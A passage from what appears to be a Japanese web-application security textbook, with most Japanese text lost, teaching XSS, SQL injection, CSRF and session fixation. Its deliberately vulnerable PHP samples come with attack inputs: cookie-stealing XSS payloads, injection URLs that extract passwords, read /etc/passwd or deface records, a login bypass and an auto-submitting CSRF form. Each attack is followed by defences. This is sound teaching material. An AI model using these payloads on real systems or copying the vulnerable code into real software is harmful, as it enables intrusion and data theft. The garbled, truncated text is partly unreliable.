 4-19 XSS
 XSS  Web Social Networking Service  SNS XSS  
 XSS  HTML 
 JavaScript   DOM based XSS  XSS  4.3.2 
9IE8  XSS  XSS  JavaScript IE8  4-12 """Internet """""  XSS 
10 CSS  iframe 
11 43-091.php  XSS 
12$_POST "@" POST 
 XSS  HTML HTML   HTML  JavaScript  HTML  EscapeHTML  XSS 
92

 HTML 
HTML 
 HTML 
 HTML  < Character Entity Reference  &lt; HTML  <   XSS 
 HTML  420 

<html>

<body>

<form ...>

<input name="tel" value="03-1234-5678">

<input type="submit">



</form>

<p>



</p>

</form>

</html>

 4-20   4-4



  


 Tag   "<>
   

 
"<>
 "<>13

13 <  XHTML HTML4.01  93

 XSS   XSS  XSS" XSS  Cookie "  XSS  <    XSS 
/43/43-003.php
<body> <input type=text name=mail value=<?php echo $_GET['p']; ?>> </body>
 p 
1+onmouseover%3dalert(document.cookie)
URL  + %3d  =  input  
<input type=text name=mail value=1 onmouseover= alert(document.cookie)>
  onmouseover   input JavaScript 
 4-21XSS  94

 XSS  "  XSS  
/43/43-004.php
<body> <input type="text" name="mail" value="<?php echo $_GET['p']; ?>"> </body>
 p 
"+onmouseover%3d"alert(document.cookie)
 input 
<input type="text" name="mail" value="" onmouseover="alert(document.cookie)">
value=""  value onmouseover     XSS  HTML  <  "   HTML   
XSS   HTMLJavaScript  CSS  XSS  ""HTML  14
 <  &15  <  "  &  PHP  htmlspecialchars HTML htmlspecialchars  4  3   htmlspecialchars 
95

string htmlspecialchars(string $string, int $quote_style, string $charset);

  4-5htmlspecialchars 

 `$string` `$quote_style` `$charset`

   4-6  UTF-8GBK



echo htmlspecialchars($p, ENT_QUOTES, "UTF-8");

 4-6htmlspecialchars 



$quote_style 

   ENT_NOQUOTES ENT_COMPAT ENT_QUOTES

`<> `<` 





`>` `>` 





`&` `&` 





`"` `"` ×





`'` `'` ×

×



  $quote_style     $quote_style  ENT_COMPAT  ENT_QUOTES

96

htmlspecialchars  htmlspecialchars PHP  /  /  htmlspecialchars   PHP  
  Web  XSS PHP   header 
header('Content-Type: text/html; charset=UTF-8');
 6  XSS   XSS  XSS   HTML   
  4.2   XSS   XSS   XSS   Cookie  HttpOnly  Cookie  HttpOnly  JavaScript  Cookie   Cookie  HttpOnly  XSS  ID    XSS   PHP  ID  HttpOnly  php.ini  
session.cookie_httponly = On
 PHP 
97

 TRACE  Cross-Site Tracing XSTXST  JavaScript  HTTP  TRACE  Cookie  Basic   XST  XSS  XSS   TRACE  XST   XST  XST   Apache  TRTACE  httpd.conf 
TraceEnable Off
 
HTML   htmlspecialchars    htmlspecialchars    HTTP     Cookie  HttpOnly   TRACE  14XHTML  <  15script  style script 4.3.2
 Perl   Perl  XSS 
 Perl  HTML 
98

 Perl  HTML  CGLpm  escapeHTML 
#  CGI.pm  escapeHTML use CGI qw(escapeHTML); my $query = new CGI; #  CGI  # ... my $ep = escapeHTML($p); #  $p  HTML  $ep

 HTTP 
#  use CGI; my $query = new CGI; #  CGI  #  print $query->header(-charset => 'UTF-8');

4.3.2  href  URL   script 
 HTML   4-20  4-22 





 

  

<html>

 

<body onload="init('xxxx');">

<form ...>

<input name="tel" value="03-1234-5678">

<input type="submit">



</form>



<a href="http://example.jp/"> xxxx </a>

<p>





URL

</p>

<script type="test/javascript">

var x = ...;



document.write('John');

</script>



</form>

script 

</html>



99

 4-22HTML   HTML   4-7HTML 







  

 Tag  "<"

"<""&" 



  

 "<""&"""" 

 URL



 URL   

 



 JavaScript  

script    

 Tag   "</"

 JavaScript  "</"


href  src  XSS  URL a  href img frame iframe  src  URL  javascript:JavaScript  javascript  URL  JavaScript  16
100

 URL  16 javascript  VBScript vbscript:
/43/43-010.php
<body> <a href="<?php echo htmlspecialchars($_GET['url']); ?>">  </a> </body>
 URL 
http://example.jp/43/43-010.php?url=javascript:alert(document.cookie)
 HTML href  JavaScript  JavaScript 
<body> <a href="javascript:alert(document.cookie)">  </a> </body>
""JavaScript 
 4-23XSS   URL  href  src  javascript  javascript  XSS HTML  XSS  
101

 URL 
 URL  http  https   URL  HTML  17
URL 
 http:  https:  URL
 /  URL

function check_url($url) { if (preg_match('/\Ahttp:/', $url) || preg_match('/\Ahttps:/', $url) || preg_match('#\A/#', $url)) { return true; } else { return false; }
}
 http:https:  /  true false

  
 URL
 URL 
 4.7.1 
17 XSS  URL 
JavaScript 
 XSS
 Web  JavaScript   JavaScript 
 PHP  body  onload   18
102

/43/43-012.php <head><script> function init(a) {} //  </script></head> <body onload="init('<?php echo htmlspecialchars($_GET['name'], ENT_QUOTES) ?> </body>  htmlspecialchars  PHP   XSS 
name=');alert(document.cookie)//
 HTML
<body onload="init('&#039;);alert(document.cookie)//')">
 onload  HTML  JavaScript 
init('');alert(document.cookie)//')
init  4-24
 4-24XSS  103

 JavaScript   JavaScript  
1.  JavaScript  2.  HTML   JavaScript   4-8JavaScript 

 `\` `'` `"` 

 `\\` `\'` `\"` `\n`

 < >' "\  4-9JavaScript 

 `<>'"\`

JavaScript  `<>\'\"\\`

HTML  `<>\'\"\\`

 JavaScript "JavaScript  "
script  XSS
 script  JavaScript  XSS  script  Tag  HTML  JavaScript 
/43/43-013.php

<?php function escape_js($s) {
return mb_ereg_replace('([\\\\\'"])', '\\\1', $s); }
104

?> <body> <script src="jquery-1.4.4.min.js"></script> <span id="name"></span> <script>
$('#name').text('<?php echo escape_js($_GET['name']); ?>'); </script> </body>  \'"  \escape_js  JavaScript    </script> </script>  JavaScript 
<script> foo('</script>');
</script>  </script> script  </script> script   </script>  4-25
<script>  </script> 
JavaScript <script></script> JavaScript  4-25 JavaScript  XSS 
</script><script>alert(document.cookie)//

105

 4-26XSS 
 HTML script  </  JavaScript  
JavaScript 
 JavaScript 
1 JavaScript  \  "  \"'  \'  \n \  \2-11  HTML 2-2 script 1  </
 JavaScript   JavaScript JavaScript  
Unicode 
 JavaScript   JavaScript  Unicode  U+XXXX   \uXXXX 
 Unicode  escape_js_string  UTF-8escape_js_string .  1.37  
106

     /43/e scape _js_string.php
<?php //  \uXXXX  function unicode_escape($matches) {
$u16 = mb_convert_encoding($matches[0], 'UTF-16'); return preg_replace('/[0-9a-f]{4}/' , '\u$0', bin2hex($u16)); } //  \uXXXX  function escape_js_string($s) { return preg_replace_callback('/[^-\.0-9a-zA-Z]+/u', 'unicode_escape', $s } ?>

<script> alert('<?php echo escape_js_string('  and  '); ?>');
</script>

<script> alert('\ud842\udfb7and\u5409');
</script>

unicode_escape  \uXXXX  UNICODE  
 mb_convert_encoding  UTF-16
 bin2hex 
 4  \u
escape_js_string  \uXXXX  
 preg_replace_callback  unicode_escape 
JavaScript  script 
 JavaScript script  JavaScript 
107

 hidden 
 hidden  UTF-8
<input type="hidden" id="familyname" value="<?php echo htmlspecialchars( ... <script type="text/javascript"> var familyname = document.getElementById('familyname').value; //...
 input  id="familyname"   2  htmlspecialchars  
 input  2  getElementById 
 JavaScript   XSS JavaScript  

18
DOM based XSS  XSS "DOM based XSS" XSSJavaScript  DOM based XSS 
 DOM based XSS  HTML
     /43/43-011.html
<body>  <script type="text/javascript">
document.URL.match(/name=([^&]*)/); name  document.write(unescape(RegExp.$1)); </script> </body>
 HTML  name=  JavaScript   http://example.jp/43-011.html?name=YamadaURL  "Yamada"
 HTML  URL 
108

 4-27 
http://example.jp/43/43-011.html?name=<script>alert(document.cookie) </script>
 4-27DOM based XSS   JavaScript  HTML  XSS  "DOM based XSS" JavaScript   JavaScript  HTML  JavaScript  HTML  jQuery   JavaScript  span  id  DOM  text 
     /43/43-011a.html <body> <script src="jquery-1.4.4.min.js"></script>  jQuery  <span id="name"></span> <script type="text/javascript"> if (document.URL.match(/name\=([^&]*)/)) {
var name = unescape(RegExp.$1); $('#name').text(name);  } </script> </body>  < 
109

 4-28
 HTML  CSS   SNS  HTML  CSSCascading Style Sheet XSS 
 HTML  script  JavaScript  CSS  expression  19  JavaScript JavaScript  
19 Internet Explorer IE8  
 JavaScript  HTML  HTML 
 HTML  CSS   HTML PHP  HTML Purifierhttp://htmlpurifier.org/
Perl  Unicode   Perl  Unicode 
#!/usr/bin/perl use strict; use utf8; use Encode qw(decode encode); # ...
110

#  \uXXXX 

sub unicode_escape {

my $u16 = encode('UTF-16BE', $_[0]); #  UTF-16

my $hex = unpack('H*', $u16);

# 

#  4  \u

$hex =~ s/([0-9a-f]{4})/\\u\1/g;

return $hex;

}

#  \uXXXX 

sub escape_js_string {

my ($s) = @_;

#  unicode 

$s =~ s/([^-\.0-9a-zA-Z]+)/unicode_escape($1)/eg;

return $s;

}

4.3.3 


  4.4.1  " "Error Log  5.4  PHP  php.ini 
display_errors = Off


4.3  XSS  XSS   XSS  HTML XSS  XSS    XSS 



111

 NetAgent "@IT" Web   XSS 
http://www.atmarkit.co.jp/fcoding/index/webapp.html
112

4.4SQL 
 Web  SQL  SQL   SQL  SQL   4.4.1SQL   SQL  SQL  SQL  
     SQL  SQL  SQL  "" SQL 
  SQL 
 113

 PHP PostgreSQL SQL  
/44/44-001.php
<?php header('Content-Type: text/html; charset=UTF-8'); $author = $_GET['author']; $con = pg_connect("host=localhost dbname=wasbook user=postgres password=wasbook" $sqlstm = "SELECT id, title, author, publisher, date, price FROM books WHERE author ='$a $rs = pg_query($con, $sqlstm);
?> <body> <table border=1> <tr> <th>  ID</th><th>  </th><th>  </th><th>  </th> <th>  </th><th>  </th> </tr> <?php
$maxrows = pg_num_rows($rs); for ($i = 0; $i < $maxrows; $i++) {
$row = pg_fetch_row($rs, $i); echo "<tr>\n"; for ($j = 0; $j < 6; $j++) {
echo "<td>" . $row[$j] . "</td>\n"; } echo "</tr>\n"; } pg_close($con); ?> </table> </body>
 URL  Shakespeare 
http://example.jp/44/44-001.php?author=Shakespeare
114

 4-29    URL  44-001.php  URL   4-30 
http://example.jp/44-001.php? author='+and+cast((select+id||':'||pwd+from+users+offset+0+l
 4-30 115

 yamada:pass1 SQL   
(select id||':'||pwd from users offset 0 limit 1)
 users  id  pwd  yamada:pass1 yamada:pass1  cast  integer    SQL  SQL   SQL    SQL   UNION SELECT  SQL  UNION SELECTUNION SELECT  SQL   UNION SELECT  URL   4-31  
http://example.jp/44/44-001.php?author='+union+select+id,pwd,name,addr,null,null,null+from
116

 4-31 UNION SELECT 
 UNION SELECT  
 SQL 
 SQL  
 SQL   type  text
     /44/44-002.html
<html> <head><title>  </title></head> <body> <form action="44-003.php" method="POST">  <input type="text" name="id"><br>  <input type="text" name="pwd"><br> <input type="submit" value="  "> </form> </body> </html>

/44/44-003.php
<?php session_start(); header('Content-Type: text/html; charset=UTF-8'); $id = @$_POST['id']; //  $pwd = @$_POST['pwd']; //  //  $con = pg_connect("host=localhost dbname=wasbook user=postgres password=wasbook" //  SQL  $sql = "SELECT * FROM users WHERE id ='$id' and pwd = '$pwd'"; $rs = pg_query($con, $sql); // 
?> <html> <body> <?php
if (pg_num_rows($rs) > 0) { //  SELECT  $_SESSION['id'] = $id; echo '  ';
} else {
117

echo '  '; } pg_close($con); ?> </body> </html>
 yamada  pass1 
 4-32  
' or 'a'='a

 4-33  SQL 
SELECT * FROM users WHERE id ='yamada' and pwd = '' OR 'a'='a' SQL  OR 'a' = 'a'  WHERE   SQL   SQL   SQL  URL  
http://example.jp/44/44-001.php?author=';update+books+set+title%3D'<i>cracked!</i>'+where+ 118

 Shakespeare"""cracked "
 4-34  SQL  --  SQL 
SELECT * FROM books WHERE author ='';update books set title='<i>cracked!</i>'  HTML  i  HTML   iframe  script    http://example.jp/44 "12. resetdb " http://example.jp/44/resetdb.php   SQL 
 OS   
119

 HTTP   44-001.php   URL  http://example.jp/44/44-001.php?author=';copy+books(title)+from+'/etc/passwd'- SQL  copy books(title) from '/etc/passwd'  COPY  PostgreSQL   /etc/passwd  books  title  COPY  PostgreSQL    URL  http://example.jp/44/44-001.php?author='or+author+is+null- SQL  author  NULL 
 4-35/etc/passwd  /etc/passwd  SQL   SQL  SQL  Web [2]
120

SQL SQL  
  SQL SQL  INFORMATION_SCHEMA  tables  columns    4-36  SQL  columns  user   **
http://example.jp/44/44-001.php?author='+union+select+table_name,column_name,data_type,
 4-36 SQL   SQL  SQL   20  SQL  'Shakespeare'  -5 SQL   21 20 SQL "" 21
 SQL   "O'Reilly" SQL  O''Reilly   SQL  SQL
121

 SELECT * FROM books WHERE author='O'Reilly'
 SQL 
 4-37 SQL  " O'Reilly " 22 " Reilly' "  SQL  "Reilly' " SQL  SQL  SQL  SQL    SQL   
 4-38SQL   SQL   SQL  SQL  Web PHPPerlRuby    SQL  age  SELECT * FROM employees WHERE age < $age
122

 $age  SQL  1;DELETE FROM employees  SQL 
SELECT * FROM employees WHERE age < 1;DELETE FROM employees
 SQL    ;   SQL  22
  SQL   SQL  SQL  SQL   a SQL  b SQL SQL  ba 23 23 SQL IPA  SQL [5]
 SQL   SQL  SELECT * FROM books WHERE author = ? ORDER BM id SQL  Place Holder""  MDB2  SQL 
/44/44-004.php
<?php require_once 'MDB2.php'; header('Content-Type: text/html; charset=UTF-8'); $author = $_GET['author'];
123

//  UTF-8 $mdb2 = MDB2::connect('pgsql://wasbook:wasbook@localhost/wasbook?charset=utf8' $sql = "SELECT * FROM books WHERE author = ? ORDER BM id"; //  SQL 2  $stmt = $mdb2->prepare($sql, array('text')); //  SQL execute  $rs = $stmt->execute(array($author)); //  $mdb2->disconnect(); //  ?>
author = ?  execute  
 MDB2  PHP  MySQL  PostgreSQL  PEAR  MDB2   2010  12 
MDB2 PDO     PEAR  DB    SQL    24  SQL   SQL   SQL  4-39
124

 4-39  SQL  SQL    SQL  SQL   Bug  SQL  4-40
 4-40  SQL   SQL    SQL  JVN#5974872325  [4] LIKE   LIKE  SQL   LIKE _  1 %  1 _  % 
125

 LIKE  _  %  SQL  
 LIKE  name  ""
WHERE name LIKE '%  %'
 LIKE  _  %  ESCAPE  26 #  
 name  %  %  #%  %
WHERE name LIKE '%#%%' ESCAPE '#'
 SQL 
 PHP  PostgreSQL  MySQL PHP 

function escape_wildcard($s) { return mb_ereg_replace('([_%#])', '#\1', $s);
}

  4-10


MySQL PostgreSQL
Oracle
MS SQL Server

 
\_ % \_ %
\_ % \_ %


 

\_ % [

 1



126



1MS SQL Server  [a-z] [a-z]  1   [  [ http://msdn.microsoft.com/zh-cn/library/ms179859.aspx

 4-11

 MySQL PostgreSQL Oracle 2
MS SQL Server
IBM DB2


5.5 9.0.2 11g SQL Server 2008 R2
9.7

http://dev.mysql.com/doc/refman/5.5/en/string http://www.postgresql.jp/document/pg902doc http://download.oracle.com/docs/cd/E16338_
http://msdn.microsoft.com/ja-jp/library/ms179
http://publib.boulder.ibm.com/infocenter/db2lu topic=/com.ibm.db2.luw.sql.ref.doc/doc/r0000

2Oracle 11g   Oracle Database 11g Enterprise Edition Release 11.1.0.6.0 

 Web  SQL   SQL  SQL   SQL 

Web SQL   SQL 
 ?  SQL  SQL PHP  $title  $price 

//  SQL 

127

//  SQL  $sql = 'SELECT id, title, author, publisher, date, price FROM books'; if ($title !== '') { //  title LIKE
$conditions[] = "title LIKE ? ESCAPE '#'"; $ph_type[] = 'text'; $ph_value[] = escape_wildcard($title); } if ($price !== '') { //  price  $conditions[] = "price <= ?"; $ph_type[] = 'integer'; $ph_value[] = $price; } if (count($conditions) > 0) { //  WHERE  $sql .= ' WHERE ' . implode(' AND ', $conditions); } $stmt = $mdb2->prepare($sql, $ph_type); //  SQL  $rs = $stmt->execute($ph_value); // 
 2  

 SQL  SQL  ORDER BY   SQL  $row   row=author 
SELECT * FROM books ORDER BM $row
 $row  SQL 
cast((select id||':'||pwd FROM users limit 1) as integer)
 SQL 
SELECT * FROM books ORDER BM cast((select id||':'||pwd FROM users limit

ERROR: integer  : "yamada:pass1"
 ORDER BY  SQL UPDATE 
128

 sort  $sort_columns  array_search   SQL  ORDER BY 
$sort_columns = array('id', 'author', 'title', 'price'); $sort_key = $_GET['sort']; if (array_search($sort_key, $sort_columns) !== false) {
$sql .= ' ORDER BM ' . $sort_key; }
SQL 
 SQL   




 SQL   SQL SQL   SQL  
PHP  php.ini 
display_errors = Off

 4.2    SQL 
 SQL   SQL 

 Web  SQL  
129

 Web  SQL  
  
"" SQL   SQL  
24 ISO  JIS Prepared Statement
25 http://jvn.jp/en/jp/JVN59748723/
26MySQL  ESCAPE  \  SQL ISO  JIS ESCAPE  ESCAPE 
  SQL SQL   SQL 
 SQL  SQL  SQL  
 IPA  SQL [5]


Web [2]  Justin Clarke SQL [1] 
 UNION SELECT  SQL  Blind SQL InjectionWeb [3] SQL [1]
  SQL  
130

   SQL  quote  SQL   Cast   IPA SQL [5]
Perl+MySQL  Perl  MySQL  Perl  SQL  DBI/DBD   MySQL  
my $db = DBI->connect('DBI:mysql:books:localhost; mysql_server_prepare=1;mysql_enable_utf8=1', 'username', 'password') || die $DBI::errstr;
PHP+PDO+MySQL   PHP  MySQL  PDOPHP Data ObjectsPDO  SQL  PDO  MySQL  
$dbh = new PDO('mysql:host=localhost;dbname=wasbook', 'username', 'password', array
PDO::MMSQL_ATTR_READ_DEFAULT_FILE => '/etc/mysql/my.cnf', PDO::MMSQL_ATTR_READ_DEFAULT_GROUP => 'client', PDO::ATTR_EMULATE_PREPARES => false, ));
 /etc/mysql/my.cnfMySQL 
[client] default-character-set=utf8
Java+MySQL 
131

Java+MySQL  Java  MySQL  JDBC  MySQL Connector/J 
Connection con = DriverManager.getConnection( "jdbc:mysql://localhost/dbname?user=xxx&password=xxxx& useServerPrepStmts=true&useUnicode=true&characterEncoding=utf8")
 [1] Justin Clarke.2009. SQL Injection Attacks and Defence. Syngress. [2]  .2007.Web . · . [3]  .2008. Web  Tips Web  . ·· . [4] 2008  12  22 . Java  MySQL  Unicode  U+00A5  SQL  Java  MySQL   Uninode  U+00A5  SQL . 2010  12  23   : http://www.tokumaru.org/d/20081222.html#p01 [5] IPA.2010  3  18 .  SQL   SQL . 2010  12  7   : http://www.ipa.go.jp/security/vuln/websecurity.html
132

4.5
Web  ""27  27 Cross-Site Request Forgeries CSRF CSRF  4.5.1        CSRF    CSRF CSRF   CSRF  Web  CSRF 
    CSRF   CSRF  28 28  CSRF  "" CSRF 
133


 CSRF "" 
"" CSRF 
"" PHP  
/45/45-001.php
<?php //  session_start(); $id = @$_GET['id']; if (! $id) $id = 'yamada'; $_SESSION['id'] = $id;
?> <body>  (id:<?php echo
htmlspecialchars($id, ENT_NOQUOTES, 'UTF-8'); ?>)<br> <a href="45-002.php">  </a> </body>
/45/45-002.php
<?php session_start(); //  
?> <body>
134

<form action="45-003.php" method="POST">  <input name="pwd" type="password"><br> <input type="submit" value="  "> </form> </body>
/45/45-003.php
<?php function ex($s) { //  XSS  HTML  echo htmlspecialchars($s, ENT_COMPAT, 'UTF-8'); } session_start(); $id = $_SESSION['id']; //  //   $pwd = $_POST['pwd']; //  //   $id  $pwd
?> <body> <?php ex($id); ?>  </body>
 4-41 
135

 4-41  45-003.php   3 
 POST  45-003.php   POST  pwd   CSRF  CSRF  HTML 
136

     /45/45-900.html
<body onload="document.forms[0].submit()"> <form action="http://example.jp/45/45-003.php" method="POST"> <input type="hidden" name="pwd" value="cracked"> </form> </body>
 CSRF  HTML    HTML  4-42 
 4-42 CSRF    cracked
 4-43CSRF  137

 iframe  45-901.html
 4-44 iframe   iframe  CSRF  
  CSRF  CSRF   CSRF  XSS  CSRF XSS   4-45   CSRF  XSS CSRF  XSS  
 4-45CSRF  XSS  CSRF 
138

  XSS   HTML  JavaScript  JavaScript ----  XSS  CSRF  
CSRF   CSRF  XSSCSRF   CSRF    CSRF      hidden type  hidden  input  hidden    hidden   hidden 
139

 4-46 hidden   CSRF  HTTP   HTML   CSRF   4-47  
 4-47 140

 1.  POST  2. 
 2  iframe 
 4-48 2  iframe  iframe1  POST    10 iframe2  CSRF      iframe   CSRF  CSRF   CSRF  
141

URL 



 Web  CSRF   XSS  
 CSRF  Web 
1form  action  URL
2 Cookie  ID 
12  ID  Cookie  
 CSRF  
 HTTP 
POST /45/45-003.php HTTP/1.1 Referer: http://example.jp/45/45-002.php Content-Type: application/x-www-form-urlencoded Host: example.jp Cookie: PHPSESSID=isdv0mecsobejf2oalnuf0r1l2 Content-Length: 9
pwd=pass1
CSRF  HTTP 
POST /45/45-003.php HTTP/1.1 Referer: http://trap.example.com/45/45-900.html Content-Type: application/x-www-form-urlencoded Host: example.jp Cookie: PHPSESSID=isdv0mecsobejf2oalnuf0r1l2 Content-Length: 9
142

pwd=pass1
HTTP  Referer   Referer  URL CSRF  HTTP  Referer  URL  HTTP  Referer Web  Referer   CSRF   Cookie   CSRF  HTTP SSL  IDi-modeIDEZ   CSRF 
  CSRF   CSRF 
 CSRF     CSRF   CSRF  CSRF  Web   Web  EC  CSRF  EC   CSRF   EC  CSRF """" 29 CSRF 
143

 4-49EC  
 CSRF   CSRF   CSRF     CSRF  "" 
 4-50·  3 
144



 Referer


 CSRF   Token ID 


<form action="chgpwddo.php" method="POST">  <input name="pwd" type="password"><br> <input type="hidden" name="token" value="<?php echo htmlspecialchars(session_id
 <input type="submit" value="  "> </form>



session_start();



if (session_id() !== $_POST['token']) {

die('  '); // 

}

// 

 CSRF 
"" 
 POST  GET  Referer  30

 

145

 4.6.2  Replay Attack    CSRF   
CSRF   ID      ID      CSRF     CSRF  31
 CSRF   3 ""
 Referer  Referer CSRF " " CSRF  Referer   Referer   URL Referer 
146

if (preg_match('#\Ahttp://example\.jp/45/45-002\.php#', @$_SERVER['HTTP_REFERER']) !== 1) {
die('  '); //  }
 Referer  Referer  Referer   Referer  Referer  
 Referer  

// Referer  if (preg_match('#^http://example\.jp#', @$_SERVER['HTTP_REFERER'])
!== 1) { //  //  URL example.com example.jp // http://example.jp.trap.example.com/trap.html

 example.jp  /  Referer   URL /
 Referer  2  Referer  
 Referer  CSRF  
CSRF 
 CSRF  4-12 
 4-12CSRF 

   Referer 

   

 *1





147

    

  





















  

 



  

  

 





 Referer    

   CSRF  

*1  CSRF  
CSRF 

 CSRF  CSRF  
 CSRF  XSS  
  Web  


148

CSRF   CSRF  
 412
   Referer  CSRF   29"" CSRF   CSRF  30HTTP/1.1  RFC2616  GET 9.1.1  CSRF  GET POST   31  CSRF 
149

4.6
Web   Cookie  ID  ID   
4.6.1  ID   ID   ID  3 
 ID  ID  ID  3   ID  ID  ID   3  ID  ID  ID   ID  ID   ID  ID  ID 
 Cookie  3   ID  7.3    PHP   ID  URL  Referer  4.6.3   ID  XSS 4.3.1 
150

HTTP  4.7.2   URL  ID 4.6.3  
 ID  ID  ID  "" ID" "Session Fixation Attack 3   4.6.4  

 4-13

  
 





   

ID







      ID

 
  ID
  ID
XSS
HTTP     Referer





  

4.6.2 

 7.1





XSS 

4.4.1 

HTTP  4.7.2





 URL  4.6.3

 ID



151

  

 

  ID

   

 
 
 

 7.1





Cookie  4.8.2  

 ID  4.6.4





  ID 
 ID   ID  URL  ID ""     
4.6.2 ID 
  Web  ID  ID    ID   ID  PHPJava/J2EEASP.NET   ID 

152

  ID   ID 
1.  ID 2.  ID  3.  ID
 ID   ID  ID   ID   ID 
 ID   IP  UNIX    ID   Base64 4-51  ID  
153

 4-51 ID 
 ID 
 ID  ID   ID  4-51 
 ID 
 ID  

  /  / 
  
 
  ID  ID   Web  ID 
 Web 
 ID 
 Web  ID   Web  

154

 ID  Web  
 33  ID
33
 PHP  ID 
PHP  ID  MD5 
 IP 


 4-51  ID  ID   ID 
 php.ini  ID   ID php.ini 
[Session] ;; Windows  entropy_file session.entropy_file = /dev/urandom session.entropy_length = 32
/dev/urandom  Linux  Unix  Linux  /dev/urandom   34
Windows  /dev/urandom  PHP5.3.3  session.entropy_length  0  Windows Random API   ID

34/dev/urandom  OS  Linux  /dev/urandom 
  ID  
155

SQL   PHP  API  35 PHP  SQL  35http://www.tokumaru.org/d/20080818.html#p01  PHP  5.3.5    4.6.3 ID  URL   ID  Cookie  URLPHPJava  ASP.NET   ID  URL  Cookie Web   ID  URL  PC  URL  ID ID  URL 
http://example.jp/mail/123?SESSID=2F3BE9A31F093C
 ID  URL  ID  Referer   ID  URL  ID  URL  Web  ID  URL 7.4   ID  URL 
 156

 URL  ID  Referer  ID  
 PHP  ID  URL   ID  URL  PHP  ID  URL  4-14  
 4-14php.ini  ID 







session.use_cookies

 Cookie   ID

 On

session.use_only_cookies

 ID  Cookie

 On

session.use_trans_sid

 ID  URL

 Off

 ID   4-15use_cookies  use_only_cookies 

 ID  
 ID   Cookie 
 Cookie   Cookie   Cookie

use_cookies On
On

use_only_cookies On
Off

157

 URL

 

Off

On



ID 

Off

Off

URL

session.use_trans_sid  On  ID  URL Off  ID  URL  ID  URL

 ID  URL Cookie  .htaccess 
     /462/.htacce ss

php_flag session.use_cookies Off php_flag session.use_only_cookies Off php_flag session.use_trans_sid On

 3  PHP    
 /462/46-001.php

<?php session_start();
?> <body> <a href="46-002.php">Next</a> </body>

/462/46-002.php

<?php session_start();
?> <body>
158

<a href="http://trap.example.com/46/46-900.cgi">  </a> </body>
/462/46-900.cgi
#!/usr/bin/perl use utf8; use strict; use CGI qw/-no_xhtml :standard/; use Encode qw/encode/;  my $e_referer = escapeHTML(referer()); print encode('UTF-8', <<END_OF_HTML); Content-Type: text/html; charset=UTF-8  <body>  ID Referer  <br> $e_referer </body> END_OF_HTML
 4-52 URL  ID  
159

 4-52  Referer  ID   Referer  ID
 URL  ID   Referer  ID   Web    Web  """" 
160

 4-53 Web 
 Web  URL  Web  URL  ID  Referer   Referer 
2000  12  " Cookie  URL  ID 1---- REFERER " 36 7  Web   ID  URL  ID  Referer  
 ID 
  ID   Referer  ID 
 ID  URL  URL  

 URL  ID  Referer 
161

36Cookie  URL  ID   (1)----REFERER ----  http://web.archive.org/web/20030828174518/http://securit.gtrc.aist.go.jp/SecurIT/advisory/webmail1/
  ID  URL 
 ID  URL  ID  URL 
2000 "Cookie " Cookie
NTT Docomo  Cookie37  ID  URL 
372009  Cookie 
 Cookie38  "Cookie " Cookie  Cookie  ID  Cookie   Cookie  ID  URL  
38 Cookie  Cookie  Cookie
 Cookie URL  ID  7 
  URL  ID ID  Cookie   ID  Cookie 
PHP
PHP  ID  Cookie 
[Session] session.use_cookies = 1 session.use_only_cookies = 1
162

Java ServletJ2EE J2EE  ID  URLJ2EE  URL  HttpServletResponse  encodeURL  encodeRedirectURL  URL  ID  URL ASP.NET ASP.NET  ID  Cookie  web.config  ID  URL  web.config   ID  Cookie
<?xml version="1.0" encoding="UTF-8" ?> <configuration>
<system.web> <sessionState cookieless="false" />
</system.web> </configuration>
4.6.4 ID
  IDSession Fixation Attack 
1.  ID 2.  1  ID  3.  Web  4.  ID   ID    2   ID  ID  ID 
163

 

 .htaccess  ID  Cookie  URL 
     /463/.htacce ss
php_flag session.use_cookies On php_flag session.use_only_cookies Off php_flag session.use_trans_sid On





/463/46-010.php
<?php session_start();
?> <body> <form action="46-011.php" method="POST">  :<input name="id" type="text"><br>
164

<input type="submit" value="  "> </form> </body>
     /463/46-011.php
<?php session_start(); $id = $_POST['id']; //  ID  $_SESSION['id'] = $id; // 
?> <body> <?php echo htmlspecialchars($id, ENT_COMPAT, 'UTF-8'); ?>  <br> <a href="46-012.php">  </a> </body>
/463/46-012.php
<?php session_start();
?> <body>  :<?php echo htmlspecialchars($_SESSION['id'],
ENT_COMPAT, 'UTF-8'); ?><br> </body>

 4-54   URL   Cookie
165

http://example.jp/463/46-010.php?PHPSESSID=ABC
  tanaka ID  
 4-55 URL  PHPSESSIS=ABC  ID   URL 
http://example.jp/463/46-012.php?PHPSESSID=ABC
  Google Chrome 
 4-56       3 "
166

"
/463/46-020.php
<?php session_start(); $name = @$_SESSION['name']; $mail = @$_SESSION['mail'];
?> <html> <head><title>  </title></head> <body> <form action="46-021.php" method="POST">  :<input name="name" value="<?php echo htmlspecialchars($name, ENT_COMPAT  :<input name="mail" value="<?php echo htmlspecialchars($mail, ENT_COMPAT <input type="submit" value="  "> </form> </body> </html>
/463/46-021.php
<?php session_start(); $name = $_SESSION['name'] = $_POST['name']; $mail = $_SESSION['mail'] = $_POST['mail'];
?> <head><title>  </title></head> <body> <form action="46-022.php" method="POST">  :<?php echo htmlspecialchars($name, ENT_COMPAT, 'UTF-8'); ?><br>  :<?php echo htmlspecialchars($mail, ENT_COMPAT, 'UTF-8'); ?><br> <input type="submit" value="  "><br> <a href="46-020.php">  </a> </form> </body> </html>
/463/46-022.php
<?php session_start(); $name = $_SESSION['name']; $mail = $_SESSION['mail'];
?> <head><title>  </title></head>
167

<body>  <br>  :<?php echo htmlspecialchars($name, ENT_COMPAT, 'UTF-8'); ?><br>  :<?php echo htmlspecialchars($mail, ENT_COMPAT, 'UTF-8'); ?><br> </body> </html>

 4-57  URL  
http://example.jp/463/46-020.php?PHPSESSID=ABC
 168

 4-58  URL  
 4-59      PHPSESSID=ABC  ID ABC  ID  PHP Session Adoption PHPASP.NET  PHP  ASP.NET  Tomcat  ID    ID ID     Cookie  ID  ID
169

 ID  URL   ID  URL  ID  Cookie  ID   Cookie  ID  Web   Cookie  
Cookie Monster Bug 3.1   4.3  HTTP  4.7.2   tanaka 
  ID  ID 
 ID  URL  Cookie Monster Bug39   Cookie Monster Bug    HTTP   Cookie  39Cookie Monster Bug  3.1   Internet Explorer  Cookie Monster BugInternet Explorer    ID    ID 

170

 ID  BugWeb 
 ID
PHP  session_regenerate_id 
session_regenerate_id 
bool session_regenerate_id([bool $delete_old_session = false])
session_regenerate_id   ID  true 
 ID 
     /463/46-011a.php
<?php session_start(); $id = $_POST['id']; //  session_regenerate_id(true); //  ID $_SESSION['id'] = $id; // 
?> <body> <?php echo htmlspecialchars($id, ENT_COMPAT, 'UTF-8'); ?>  <br> <a href="46-012.php">  </a> </body>
 ID 
